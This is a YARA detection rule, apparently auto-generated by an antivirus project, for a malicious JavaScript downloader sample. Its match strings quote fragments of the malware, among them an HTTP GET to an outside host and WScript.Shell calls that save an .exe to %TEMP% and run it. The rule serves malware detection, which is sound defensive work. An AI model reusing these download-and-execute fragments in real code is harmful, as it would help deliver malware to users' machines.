rule sig_20160328_d94dfa4c7a0963289e91214db500958f {
  meta:
    description = "datamaliciousorder - file 20160328_d94dfa4c7a0963289e91214db500958f.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "003c1234e78062040e5c1ae3dd09e7c49bf5db3de5526840f91d7aecec9a8c40"

  strings:
    $s1  = "function Pwwlkqyfa() {return Odmhhjetji[\"ExpandEnvironmentStrings\"](\"%TEMP%/\") + \"C2wmkf8eWzu.exe\";};" fullword ascii
    $s2  = "Sqpro[Kjukkgfel](\"GET\", \"http://bombers-original.com/mdj6sf\", false);" fullword ascii
    $s3  = "do {WScript[Dddijbngtp](Hwxxr() * 11)} while (Sqpro[\"readystate\"] < 2 * 2);" fullword ascii
    $s4  = "function Nmlim(Lmmtdimdl, Xexikzjv){return Lmmtdimdl - Xexikzjv;};" fullword ascii
    $s5  = "var Odmhhjetji = function Bmofkwsjrh() {return WScript[Isknsfmoxh](\"WScript.Shell\");}();" fullword ascii
    $s6  = "function Uhjimb() {return ((Biblz == true) && (Biblz == Yjgvdxzs)) ? 1 : Lkmodgdrvy;};" fullword ascii
    $s7  = "function Eujtwzkdv(Rhviznmg){Odmhhjetji[\"Run\"](Rhviznmg, Lkmodgdrvy, Lkmodgdrvy);};" fullword ascii
    $s8  = "var Ntvztncwg = new this[\"Date\"]();" fullword ascii
    $s9  = "function Cszqxv(Snhnlizhrk) {var Tawhermy = (1, 2, 3, 4, 5, Snhnlizhrk); return Tawhermy;};" fullword ascii
    $s10 = "function Axsplrua(){return Yduhysay;};" fullword ascii
    $s11 = "Biblz = true; " fullword ascii
    $s12 = "Yjgvdxzs = true; " fullword ascii
    $s13 = "function Zoqkhyrt()" fullword ascii
    $s14 = "return Nmlim(Pwfcoilw, Gnwtqnp);" fullword ascii
    $s15 = "var Mmvrol = false;" fullword ascii
    $s16 = "function Hwxxr(){return 22;};" fullword ascii
    $s17 = " while (Bubkgmau){" fullword ascii
    $s18 = "var Biblz = false;" fullword ascii
    $s19 = "var Yjgvdxzs = false;" fullword ascii
    $s20 = "function Xlabpgwd(){return Isknsfmoxh;};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}